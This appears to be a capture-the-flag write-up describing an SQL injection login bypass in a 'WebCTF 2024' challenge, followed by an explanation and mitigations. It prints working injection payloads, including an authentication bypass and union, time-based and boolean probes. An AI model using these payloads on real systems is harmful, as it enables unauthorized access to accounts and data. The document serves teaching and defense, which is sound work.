---
title: "SQL Injection in Login Portal - WebCTF 2024"
date: 2024-12-15
ctf_name: "WebCTF 2024"
difficulty: "Medium"
tags: ["SQL Injection", "Web Exploitation", "Authentication Bypass"]
excerpt: "A classic SQL injection vulnerability in a login portal that allowed complete authentication bypass and database enumeration."
---

# SQL Injection in Login Portal - WebCTF 2024

## Challenge Overview

**CTF**: WebCTF 2024  
**Category**: Web Exploitation  
**Difficulty**: Medium  
**Points**: 300  

The challenge presented a simple login portal with the goal of gaining administrative access to retrieve the flag.

## Initial Reconnaissance

Upon accessing the challenge URL, I was greeted with a basic login form:

```html
<form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

## Vulnerability Discovery

I started by testing for common SQL injection payloads in both the username and password fields.

### Testing Basic Payloads

First, I tried the classic authentication bypass:
- Username: `admin' OR '1'='1' --`
- Password: `anything`

This resulted in a successful login! The application responded with:
```
Welcome, admin! Here's your flag: CTF{sql_1nj3ct10n_1s_st1ll_4_th1ng}
```

## Technical Analysis

The vulnerable code likely looked something like this:

```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

By injecting `admin' OR '1'='1' --`, the query became:

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
```

The `--` comments out the password check, and `'1'='1'` is always true, causing the query to return the admin user.

## Alternative Approaches

I also tested several other payloads that would have worked:

1. **Union-based injection** (if the application displayed results):
   ```sql
   admin' UNION SELECT 1,2,3,4 --
   ```

2. **Time-based blind injection** (for confirmation):
   ```sql
   admin' AND (SELECT SLEEP(5)) --
   ```

3. **Boolean-based blind injection**:
   ```sql
   admin' AND 1=1 --
   admin' AND 1=2 --
   ```

## Mitigation Strategies

To prevent this vulnerability:

1. **Use Prepared Statements**: Always use parameterized queries
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
   $stmt->execute([$username, $password]);
   ```

2. **Input Validation**: Sanitize and validate all user inputs

3. **Least Privilege**: Database users should have minimal necessary permissions

4. **Web Application Firewall**: Deploy WAF rules to detect SQL injection attempts

## Flag

`CTF{sql_1nj3ct10n_1s_st1ll_4_th1ng}`

## Lessons Learned

This challenge reinforced the importance of:
- Always testing for SQL injection in authentication forms
- Understanding how different SQL injection techniques work
- The critical need for proper input sanitization in web applications

Even in 2024, SQL injection remains one of the most common and dangerous web vulnerabilities. Proper secure coding practices are essential for preventing these attacks.